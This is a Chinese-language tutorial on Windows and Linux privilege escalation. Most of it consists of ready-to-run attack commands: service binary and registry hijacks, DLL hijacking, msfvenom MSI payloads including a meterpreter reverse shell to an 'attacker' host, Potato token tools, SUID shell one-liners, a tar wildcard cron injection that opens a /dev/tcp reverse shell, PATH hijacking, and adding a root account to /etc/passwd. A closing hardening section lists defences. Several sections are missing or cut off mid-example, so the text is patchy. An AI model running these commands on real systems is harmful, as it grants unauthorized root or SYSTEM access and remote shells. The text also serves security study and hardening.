## 一、提权概述

### 1.1 权限模型

**Windows权限模型**

Windows使用安全描述符（Security Descriptor）和访问控制列表（ACL）管理权限：

```
+-------------------+
|  Security Token   |  包含用户SID、组SID、特权列表
+-------------------+
        |
        v
+-------------------+
|  Access Token     |  访问令牌（进程级）
|  - User SID      |
|  - Group SIDs    |
|  - Privileges    |
|  - Integrity Level|
+-------------------+
        |
        v
+-------------------+        +-------------------+
|  Process          | ----->|  Object           |
|  (访问者)          |        |  (被访问资源)      |
+-------------------+        |  - DACL          |
                             |  - SACL          |
                             |  - Owner         |
                             +-------------------+
```

Windows完整性级别（Integrity Level）：

| 级别 | SID | 说明 |
|------|-----|------|
| Untrusted | S-1-16-0 | 最低权限，如IE保护模式 |
| Low | S-1-16-4096 | 低权限，如AppContainer |
| Medium | S-1-16-8192 | 标准用户权限 |
| High | S-1-16-12288 | 管理员权限 |
| System | S-1-16-16384 | SYSTEM权限 |
| Protected | S-1-16-20480 | Protected Process |

**Linux权限模型**

Linux使用UID/GID和文件权限位管理权限：

```
+-------------------+
|  Process          |
|  - real UID       |  启动进程的用户
|  - effective UID  |  实际决定权限的UID
|  - saved UID      |  保存的set-UID
|  - fs UID         |  文件系统访问UID
+-------------------+
        |
        v
+-------------------+        +-------------------+
|  /etc/passwd      |        |  File             |
|  user:x:1000:...  |        |  -rwsr-xr-x      |
|  root:x:0:0:...   |        |  SUID/GUID位      |
+-------------------+        |  -rwxrwxrwx      |
                             +-------------------+
```

特权分离：
- root (UID=0)：拥有所有权限
- 普通用户：受文件权限限制
- SUID/SGID：程序以文件属主权限执行
- sudo：用户临时获得root权限
- capabilities：细粒度权限分配

### 1.2 提权分类

| 类型 | 说明 | 示例 |
|------|------|------|
| 垂直提权 | 低权限提升到高权限 | 普通用户->root/admin |
| 水平提权 | 同级别权限横向扩展 | 用户A->用户B |
| 内核提权 | 利用内核漏洞提权 | CVE-2021-3156 (sudo) |
| 配置提权 | 利用配置缺陷提权 | 弱服务权限、SUID滥用 |
| 凭证提权 | 获取高权限凭证 | 密码提取、令牌窃取 |

```
   - 运行exploit
   - 获取SYSTEM权限shell
```

### 2.2 服务配置缺陷

**服务权限配置不当**

Windows服务的权限如果配置不当，低权限用户可以修改服务配置：

```cmd
# 枚举所有服务及权限
sc query state= all
wmic service list brief

# 使用accesschk检查服务权限
accesschk.exe -uwcqv "Authenticated Users" *

# 查找可修改的服务
accesschk.exe -uwcqv "Users" *
```

**可写服务路径利用**

如果服务二进制路径可被普通用户修改：

```cmd
# 查看服务配置
sc qc VulnService

# 如果BINARY_PATH_NAME指向用户可写目录
# 替换服务二进制为恶意程序
copy /Y evil.exe "C:\Vulnerable\Path\service.exe"

# 重启服务
sc stop VulnService
sc start VulnService
```

**修改服务路径**

如果对服务有 SERVICE_CHANGE_CONFIG 权限：

```cmd
# 修改服务二进制路径
sc config VulnService binPath= "C:\evil\payload.exe"

# 重启服务以SYSTEM权限执行
sc stop VulnService
sc start VulnService
```

PowerShell版本：

```powershell
# 修改服务路径
Set-Service -Name VulnService -BinaryPathName "C:\evil\payload.exe"

# 重启服务
Restart-Service -Name VulnService -Force
```

### 2.3 未加引号的服务路径

当服务路径包含空格且未加引号时，Windows会按序尝试执行路径中的每个可执行文件：

```
服务路径: C:\Program Files\My Service\service.exe

Windows执行顺序:
  1. 尝试执行 C:\Program.exe     <- 如果存在则执行
  2. 尝试执行 C:\Program Files\My.exe  <- 如果存在则执行
  3. 最终执行 C:\Program Files\My Service\service.exe
```

**枚举未加引号服务**

```cmd
# 使用wmic查找
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 使用PowerShell
Get-CimInstance -ClassName Win32_Service | 
    Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } |
    Select-Object Name, DisplayName, PathName
```

**利用步骤**

```cmd
# 1. 找到未加引号服务
sc qc UnquotedService
# BINARY_PATH_NAME = C:\Program Files\Some Service\bin\service.exe

# 2. 检查可写目录
icacls "C:\Program Files\Some Service"
# 如果Users有写权限

# 3. 创建恶意可执行文件
copy payload.exe "C:\Program.exe"
# 或
copy payload.exe "C:\Program Files\Some.exe"

# 4. 重启服务
sc stop UnquotedService
sc start UnquotedService
```

### 2.4 弱权限利用

**可写目录利用**

```cmd
# 查找全权限目录
icacls "C:\*" 2>nul | findstr "F" | findstr "Users"

# 常见弱权限目录
# C:\Windows\Temp
# C:\Windows\Tasks
# C:\ProgramData\
# C:\Users\Public\

# 检查服务目录权限
icacls "C:\Program Files\Vulnerable Service\"
# 如果Users:(W)或Users:(M)则可利用
```

**DLL劫持**

如果服务加载的DLL位于可写目录：

```cmd
# 使用Process Monitor监控DLL加载
# 过滤: Path包含服务名, Result=NAME NOT FOUND

# 在可写目录放置恶意DLL
copy evil.dll "C:\Program Files\Vulnerable Service\missing.dll"

# 重启服务
sc stop VulnService
sc start VulnService
```

**注册表权限**

```cmd
# 检查服务注册表权限
accesschk.exe -k -q "HKLM\SYSTEM\CurrentControlSet\Services\VulnService"

# 如果可写，修改ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\evil\payload.exe" /f
```

### 2.5 AlwaysInstallElevated

当注册表设置`AlwaysInstallElevated`为1时，Windows Installer（MSI）包以SYSTEM权限安装，无论当前用户权限如何。

```cmd
# 检查是否启用
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 如果两个值都为1，则可利用
```

**利用方法**

```bash
# 使用msfvenom生成恶意MSI
msfvenom -p windows/exec CMD='net user hacker P@ss123! /add' \
    -f msi -o evil.msi

# 或生成反向shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 \
    -f msi -o shell.msi

# 执行MSI
msiexec /quiet /qn /i evil.msi
```

### 2.6 令牌模拟

Windows令牌模拟（Token Impersonation）允许进程获取其他用户的安全令牌，以该用户身份执行操作。

**Potato系列工具**

```bash
# RottenPotato - 利用DCOM/RPC实现NTLM中继
# JuicyPotato - RottenPotato的改进版
# PrintSpoofer - 利用打印服务
# GodPotato - Windows Server 2012-2022

# PrintSpoofer利用
PrintSpoofer.exe -i -c "cmd.exe"

# GodPotato利用
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato利用
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {CLSID}
```

**令牌模拟原理**

```
1. 获取SYSTEM权限令牌
   - 通过COM服务（如BITS、DCOM）
   - 通过NTLM中继
   - 通过打印服务

2. 模拟令牌
   - 使用ImpersonateNamedPipeClient
   - 使用ImpersonateLoggedOnUser
   - 通过named pipe

3. 以SYSTEM身份执行命令
   - CreateProcessWithTokenW
   - CreateProcessAsUserW
```

**meterpreter令牌模拟**

```bash
# 在meterpreter中
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter> getuid  # 确认权限
```

## 三、Linux提权技术

### 3.1 SUID提权

SUID（Set Owner User ID）位允许程序以文件属主权限执行。如果SUID程序属主是root，程序以root权限运行。

**查找SUID程序**

```bash
# 查找所有SUID程序
find / -perm -4000 -type f 2>/dev/null

# 查找SGID程序
find / -perm -2000 -type f 2>/dev/null

# 查找SUID和SGID
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null

# 查找可写的SUID程序（最佳利用目标）
find / -perm -4000 -type f -writable 2>/dev/null
```

**GTFOBins利用**

[GTFOBins](https://gtfobins.github.io) 是一个Unix程序利用数据库，记录了各种程序在SUID/sudo/capabilities条件下的利用方法。

常见SUID提权程序：

| 程序 | 利用方式 | 命令 |
|------|---------|------|
| nmap | 交互式Shell | `nmap --interactive` -> `!sh` |
| find | 命令执行 | `find . -exec /bin/sh \; -quit` |
| python | Shell | `python -c 'import os;os.system("/bin/sh")'` |
| perl | Shell | `perl -e 'exec "/bin/sh";'` |
| ruby | Shell | `ruby -e 'exec "/bin/sh"'` |
| bash | Shell | `bash -p` |
| less | Shell | `less /etc/passwd` -> `!/bin/sh` |
| more | Shell | `more /etc/passwd` -> `!/bin/sh` |
| cp | 文件复制 | 复制/etc/shadow或替换/etc/passwd |
| mv | 文件移动 | 替换系统文件 |
| vim | Shell | `vim -c ':!/bin/sh'` |
| env | Shell | `env /bin/sh` |
| awk | Shell | `awk 'BEGIN {system("/bin/sh")}'` |
| python3 | Shell | `python3 -c 'import pty;pty.spawn("/bin/sh")'` |
| nice | Shell | `nice /bin/sh` |
| timeout | Shell | `timeout 7 /bin/sh` |
| cpulimit | Shell | `cpulimit -l 100 -f /bin/sh` |

**利用示例**

```bash
# find SUID提权
find . -exec /bin/sh -p \; -quit

# python SUID提权
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl SUID提权
perl -e 'if($<==0){exec "/bin/sh"}else{print "Not root\n"}'

# vim SUID提权
vim.tiny -c ':!/bin/sh' /dev/null
# 或
echo ':!/bin/sh' | vim.tiny /dev/null

# cp 利用 - 复制并替换passwd
# 在攻击机上:
openssl passwd -1 -salt hacker password123  # 生成密码哈希
# $1$hacker$6rX9oXQ/v3Yn3pYv3wY3..
# 将哈希添加到/etc/passwd:
echo 'hacker:$1$hacker$6rX9oXQ/v3Yn3pYv3wY3..:0:0::/root:/bin/bash' >> /etc/passwd
```

**自定义SUID利用**

如果发现不常见的SUID程序，可以分析其行为：

```bash
# 使用strace跟踪系统调用
strace -f /usr/local/bin/suid_program 2>&1 | grep -E "execve|access|open"

# 使用ltrace跟踪库调用
ltrace /usr/local/bin/suid_program

# 检查程序调用的命令
strings /usr/local/bin/suid_program | grep -E "^/(bin|sbin|usr)"
```

### 3.3 Cron任务利用

Cron定时任务如果配置不当，可以用于提权。

**Cron任务查看**

```bash
# 查看系统cron任务
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 查看用户cron任务
crontab -l
ls -la /var/spool/cron/
cat /var/spool/cron/*
```

**通配符注入提权**

当cron任务中使用通配符时，可以利用tar的`--checkpoint`选项注入命令：

```bash
# 场景：cron任务定期备份
# */1 * * * * root tar czf /tmp/backup.tar.gz /var/www/html/*

# 在目标目录创建特殊文件名
cd /var/www/html/

# 创建--checkpoint文件
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# 创建恶意脚本
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> shell.sh
chmod +x shell.sh

# 等待cron执行tar
# tar会将--checkpoint=1和--checkpoint-action作为参数执行
# 从而执行shell.sh
```

**Cron脚本路径劫持**

```bash
# 场景：cron执行脚本使用相对命令
```

### 3.4 PATH劫持

PATH环境变量劫持利用程序查找可执行文件的顺序：

```bash
# 查看当前PATH
echo $PATH

# 如果PATH中包含用户可写目录在前

# 场景：SUID程序调用无路径的命令
# 例如SUID程序执行 system("ps");
# 系统会按PATH顺序查找ps

# 创建恶意ps
mkdir /tmp/.hidden
echo '#!/bin/bash' > /tmp/.hidden/ps
echo 'python3 -c "import os;os.setuid(0);os.system(\"/bin/sh\")"' >> /tmp/.hidden/ps
chmod +x /tmp/.hidden/ps

# 修改PATH
export PATH=/tmp/.hidden:$PATH

# 执行SUID程序
/usr/local/bin/suid_program
# 程序调用ps时实际执行了恶意脚本
```

### 3.5 Linux Capabilities

Linux capabilities提供了比传统UID更细粒度的权限控制：

**查看文件capabilities**

```bash
# 查找带有capabilities的程序

# 查看特定文件的capabilities
getcap /usr/bin/ping
```

**利用capabilities提权**

| Capability | 说明 | 利用方法 |
|------------|------|---------|
| cap_setuid | 改变UID | 改变为root UID |
| cap_setgid | 改变GID | 改变为root GID |
| cap_dac_override | 绕过文件权限 | 读写任意文件 |
| cap_chown | 改变文件属主 | 改变敏感文件属主 |
| cap_sys_admin | 系统管理 | 多种提权方式 |
| cap_sys_ptrace | 进程追踪 | 注入代码到进程 |
| cap_net_raw | 原始网络访问 | 网络嗅探 |
| cap_net_admin | 网络管理 | 网络配置修改 |

```bash
# cap_setuid利用
# 如果python3有cap_setuid
getcap /usr/bin/python3
# /usr/bin/python3 cap_setuid=ep

# 注入到目标进程
```

## 五、防御与加固建议

**Windows加固**

```
1. 及时安装系统补丁
   - 配置WSUS或Windows Update自动更新
   - 定期检查缺失补丁

2. 服务安全配置
   - 为服务二进制路径添加引号
   - 限制服务文件和目录权限
   - 使用最小权限服务账户

3. 权限管理
   - 遵循最小权限原则
   - 定期审计用户权限和组成员
   - 限制SeImpersonate、SeAssignPrimaryToken等危险特权

4. 安全配置
   - 禁用AlwaysInstallElevated
   - 限制注册表和文件系统ACL
   - 启用UAC并设置最高通知级别

5. 监控与检测
   - 监控异常进程创建
   - 监控服务配置变更
   - 监控特权使用
```

**Linux加固**

```bash
# 1. 及时更新内核
apt update && apt upgrade -y
# 或
yum update -y

# 2. SUID审计
# 定期审计SUID程序
find / -perm -4000 -type f 2>/dev/null
# 移除不必要的SUID位
chmod u-s /usr/bin/不必要的程序

# 3. sudo配置加固
# 编辑/etc/sudoers
visudo
# 使用具体命令而非ALL
user ALL=(root) /usr/bin/systemctl restart nginx
# 启用sudo日志

# 4. Cron安全
# 确保cron脚本权限正确
chmod 600 /etc/crontab
chmod 700 /etc/cron.d/
# 在cron脚本中使用绝对路径

# 5. capabilities审计
getcap -r / 2>/dev/null
# 移除不必要的capabilities
setcap -r /usr/bin/不必要的程序

# 6. NFS安全
# 禁用no_root_squash
# 编辑/etc/exports使用root_squash

# 7. 文件权限
# 确保敏感文件权限正确
chmod 600 /etc/shadow
chmod 644 /etc/passwd
chmod 700 ~/.ssh/
chmod 600 ~/.ssh/authorized_keys

# 8. 内核参数加固
# /etc/sysctl.d/99-security.conf
kernel.exec-shield = 1
kernel.randomize_va_space = 2
fs.suid_dumpable = 0
```
